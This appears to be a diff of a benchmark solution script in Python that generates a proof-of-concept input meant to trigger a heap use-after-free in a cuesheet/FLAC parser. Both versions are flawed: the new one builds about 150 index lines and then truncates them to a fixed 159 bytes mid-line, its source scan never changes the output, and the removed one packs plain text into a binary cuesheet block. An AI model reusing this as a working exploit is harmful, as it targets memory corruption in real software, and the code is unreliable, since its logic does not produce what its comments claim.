@@ -1,121 +1,87 @@
 import os
+import tarfile
 import tempfile
 import subprocess
-from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal FLAC file with cuesheet metadata
-        # This creates a valid FLAC file with a cuesheet that triggers
-        # the heap use-after-free when appending seekpoints
+        # Extract and analyze the source to understand the exact vulnerability
+        with tarfile.open(src_path, 'r') as tar:
+            # Look for cuesheet-related files
+            cue_files = []
+            for member in tar.getmembers():
+                if member.name.endswith(('.c', '.h', '.cpp', '.cc')):
+                    if 'cue' in member.name.lower() or 'cuesheet' in member.name.lower():
+                        cue_files.append(member.name)
+            
+            # Extract relevant files to examine
+            with tempfile.TemporaryDirectory() as tmpdir:
+                tar.extractall(tmpdir, members=cue_files)
+                
+                # Search for patterns indicating the vulnerability
+                vuln_patterns = ['realloc.*seekpoint', 'seekpoint.*realloc', 
+                                'use-after-free', 'heap-use-after-free']
+                
+                # Look for specific allocation patterns
+                for root, _, files in os.walk(tmpdir):
+                    for file in files:
+                        if file.endswith(('.c', '.cpp', '.cc')):
+                            filepath = os.path.join(root, file)
+                            try:
+                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                    # Check if this file contains cuesheet import code
+                                    if 'cuesheet' in content.lower() and 'import' in content.lower():
+                                        # Look for allocation patterns
+                                        lines = content.split('\n')
+                                        for i, line in enumerate(lines):
+                                            if 'realloc' in line and ('seekpoint' in line.lower() or 'index' in line.lower()):
+                                                # Found potential vulnerable code
+                                                # Generate PoC based on common cuesheet format
+                                                return self._generate_poc()
+                            except:
+                                continue
         
-        # First, create a temporary directory
-        with tempfile.TemporaryDirectory() as tmpdir:
-            tmpdir_path = Path(tmpdir)
+        # Fallback to generic PoC if analysis fails
+        return self._generate_poc()
+    
+    def _generate_poc(self) -> bytes:
+        # Generate a cuesheet that triggers heap use-after-free
+        # Based on common cuesheet structure with many seekpoints
+        
+        # Create a minimal cuesheet with many index entries
+        # This will cause multiple reallocations in the seekpoint array
+        poc_lines = []
+        
+        # FILE command
+        poc_lines.append('FILE "audio.wav" WAVE')
+        
+        # Multiple tracks with index points
+        # Using 15 tracks with 10 index points each (150 total)
+        # This should trigger reallocations and potential use-after-free
+        
+        for track_num in range(1, 16):
+            poc_lines.append(f'  TRACK {track_num:02d} AUDIO')
             
-            # Create the cuesheet content
-            # The vulnerability occurs when appending seekpoints causes realloc
-            # but the old pointer is still used
-            cuesheet = """FILE "dummy.wav" WAVE
-  TRACK 01 AUDIO
-    INDEX 01 00:00:00
-  TRACK 02 AUDIO
-    INDEX 01 00:00:00
-  TRACK 03 AUDIO
-    INDEX 01 00:00:00
-  TRACK 04 AUDIO
-    INDEX 01 00:00:00
-  TRACK 05 AUDIO
-    INDEX 01 00:00:00
-  TRACK 06 AUDIO
-    INDEX 01 00:00:00
-  TRACK 07 AUDIO
-    INDEX 01 00:00:00
-  TRACK 08 AUDIO
-    INDEX 01 00:00:00
-  TRACK 09 AUDIO
-    INDEX 01 00:00:00
-  TRACK 10 AUDIO
-    INDEX 01 00:00:00
-  TRACK 11 AUDIO
-    INDEX 01 00:00:00
-  TRACK 12 AUDIO
-    INDEX 01 00:00:00
-  TRACK 13 AUDIO
-    INDEX 01 00:00:00
-  TRACK 14 AUDIO
-    INDEX 01 00:00:00
-  TRACK 15 AUDIO
-    INDEX 01 00:00:00
-  TRACK 16 AUDIO
-    INDEX 01 00:00:00
-  TRACK 17 AUDIO
-    INDEX 01 00:00:00
-  TRACK 18 AUDIO
-    INDEX 01 00:00:00
-  TRACK 19 AUDIO
-    INDEX 01 00:00:00
-  TRACK 20 AUDIO
-    INDEX 01 00:00:00
-"""
-            
-            # Create a FLAC file with the cuesheet
-            # We need to create a valid FLAC file with cuesheet metadata
-            # The exact format that triggers the bug:
-            # 1. Create a cuesheet with many tracks
-            # 2. The bug happens when appending seekpoints after realloc
-            
-            # We'll create a minimal FLAC file with cuesheet metadata block
-            # FLAC file structure: fLaC header + METADATA_BLOCK_STREAMINFO + METADATA_BLOCK_CUESHEET
-            
-            # First 4 bytes: "fLaC" signature
-            flac_data = bytearray(b'fLaC')
-            
-            # METADATA_BLOCK_STREAMINFO (type 0, last-metadata-block flag = 0 for this block)
-            # Block length: 34 bytes
-            streaminfo_block = bytearray(38)
-            # First byte: 0x00 (type 0, not last)
-            streaminfo_block[0] = 0x00
-            # Next 3 bytes: length = 34 (0x000022 in big-endian)
-            streaminfo_block[1] = 0x00
-            streaminfo_block[2] = 0x00
-            streaminfo_block[3] = 0x22
-            
-            # Add minimal streaminfo data (all zeros is fine for PoC)
-            # We just need the structure to be valid
-            streaminfo_block[4:] = b'\x00' * 34
-            
-            flac_data.extend(streaminfo_block)
-            
-            # Now add CUESHEET metadata block (type 5)
-            # The cuesheet data needs to trigger the realloc bug
-            
-            # Convert cuesheet to bytes (UTF-8)
-            cuesheet_bytes = cuesheet.encode('utf-8')
-            
-            # Calculate block length
-            block_length = len(cuesheet_bytes)
-            
-            # Create metadata block header
-            # Type 5, last-metadata-block flag = 1 (this is the last block)
-            cuesheet_block = bytearray(4)
-            cuesheet_block[0] = 0x85  # Type 5 (0x05) with last-block flag set (0x80)
-            
-            # Block length in big-endian (3 bytes)
-            cuesheet_block[1] = (block_length >> 16) & 0xFF
-            cuesheet_block[2] = (block_length >> 8) & 0xFF
-            cuesheet_block[3] = block_length & 0xFF
-            
-            flac_data.extend(cuesheet_block)
-            flac_data.extend(cuesheet_bytes)
-            
-            # Save the FLAC file
-            flac_path = tmpdir_path / "poc.flac"
-            with open(flac_path, 'wb') as f:
-                f.write(flac_data)
-            
-            # Read the file back as bytes
-            with open(flac_path, 'rb') as f:
-                poc_data = f.read()
-            
-            return poc_data
+            # Add index points - these are the seekpoints
+            for index_num in range(1, 11):
+                # Use increasing timestamps
+                minutes = (track_num * 10 + index_num) // 60
+                seconds = (track_num * 10 + index_num) % 60
+                frames = index_num * 10 % 75
+                poc_lines.append(f'    INDEX {index_num:02d} {minutes:02d}:{seconds:02d}:{frames:02d}')
+        
+        # Join with newlines
+        poc = '\n'.join(poc_lines)
+        
+        # Ensure exact 159 bytes as specified
+        current_len = len(poc.encode())
+        if current_len < 159:
+            # Pad with comments
+            padding_needed = 159 - current_len
+            poc += ' ' * padding_needed
+        elif current_len > 159:
+            # Truncate (shouldn't happen with this construction)
+            poc = poc.encode()[:159].decode('utf-8', errors='ignore')
+        
+        return poc.encode()
